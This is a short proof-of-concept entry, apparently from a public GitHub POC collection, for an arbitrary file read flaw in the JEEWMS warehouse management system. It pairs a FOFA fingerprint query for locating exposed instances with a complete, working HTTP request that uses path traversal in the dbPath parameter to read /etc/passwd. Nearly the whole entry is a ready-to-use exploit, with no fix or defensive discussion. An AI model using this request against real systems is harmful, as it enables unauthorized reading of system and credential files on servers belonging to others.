## JEEWMS仓库管理系统任意文件读取漏洞

## fofa
```
body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"或者fid="cC2r/XQpJXcYiYFHOc77bg=="
```
![image](https://github.com/wy876/POC/assets/139549762/0fc82b26-4cd9-4924-b461-aa64aef53160)

## poc
```
GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
Host: ip:port
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image](https://github.com/wy876/POC/assets/139549762/490b9323-3a5c-4f4a-8ca0-24e2f1ecbf6d)
